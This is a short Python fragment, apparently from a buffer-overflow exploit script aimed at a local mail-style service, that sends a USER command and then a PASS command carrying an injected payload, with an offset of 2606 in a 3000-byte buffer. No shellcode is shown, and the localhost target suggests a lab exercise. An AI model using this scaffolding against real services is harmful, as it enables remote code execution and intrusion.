HOST = "127.0.0.1"
PORT = 4444

def send_payload(s, payload):
  s.recv(1024)
  s.send('USER test\r\n')
  s.recv(1024)
  s.send('PASS ' + payload + '\r\n')
  s.close()

BUFFER_TOTLEN = 3000
BUFFER_OFFSET = 2606
